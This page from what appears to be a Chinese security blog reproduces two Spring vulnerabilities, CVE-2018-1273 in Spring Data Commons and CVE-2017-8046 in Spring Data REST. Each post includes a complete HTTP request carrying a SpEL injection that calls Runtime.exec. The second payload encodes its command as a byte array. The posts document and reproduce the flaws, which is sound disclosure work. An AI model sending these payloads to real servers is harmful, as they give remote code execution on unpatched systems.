+        <h1 id="（CVE-2018-1273）Spring-Data-Commons组件远程代码执行漏洞"><a href="#（CVE-2018-1273）Spring-Data-Commons组件远程代码执行漏洞" class="headerlink" title="（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞"></a>（CVE-2018-1273）Spring Data Commons组件远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者可以构造恶意的请求对Spring Data<br>REST发起攻击，包括使用基于HTTP资源的，或者其他请求基于Spring Data’s<br>projection负载结合的，最终导致远程代码执行攻击。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)</p>
+<p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p>
+<p>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</p>
+<p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /users?page=&amp;size=5 HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 124
+Pragma: no-cache
+Cache-Control: no-cache
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost:8080/users?page=0&amp;size=5
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Data/%EF%BC%88CVE-2018-1273%EF%BC%89Spring%20Data%20Commons%E7%BB%84%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Data/%EF%BC%88CVE-2018-1273%EF%BC%89Spring%20Data%20Commons%E7%BB%84%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvur00h4y8v15wgi13xv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Data/（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Data/%EF%BC%88CVE-2017-8046%EF%BC%89Spring%20Data%20Rest%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.030Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-8046）Spring-Data-Rest-远程命令执行漏洞"><a href="#（CVE-2017-8046）Spring-Data-Rest-远程命令执行漏洞" class="headerlink" title="（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞"></a>（CVE-2017-8046）Spring Data Rest 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Spring Data REST是一个构建在Spring<br>Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST<br>API的Patch方法中（实现RFC6902），path的值被传入setValue，导致执行了SpEL表达式，触发远程命令执行漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PivotalSpringDataREST2.5.12之前的版本，2.6.7之前的版本，3.0RC3之前的版本</p>
+<p>SpringBoot2.0.0M4之前版本</p>
+<p>SpringDataKay-RC3之前的版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>访问<code>http://www.0-sec.org:8080/customers/1</code>，看到一个资源。我们使用PATCH请求来修改之：</p>
+<pre><code>PATCH /customers/1 HTTP/1.1
+Host: www.0-sec.org:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json-patch+json
+Content-Length: 202
+
+[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Data/%EF%BC%88CVE-2017-8046%EF%BC%89Spring%20Data%20Rest%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Data/%EF%BC%88CVE-2017-8046%EF%BC%89Spring%20Data%20Rest%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvtm00h3y8v1ejrhdl3x" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/39/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/38/">38</a><a class="page-number" href="/page/39/">39</a><span class="page-number current">40</span><a class="page-number" href="/page/41/">41</a><a class="page-number" href="/page/42/">42</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/41/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
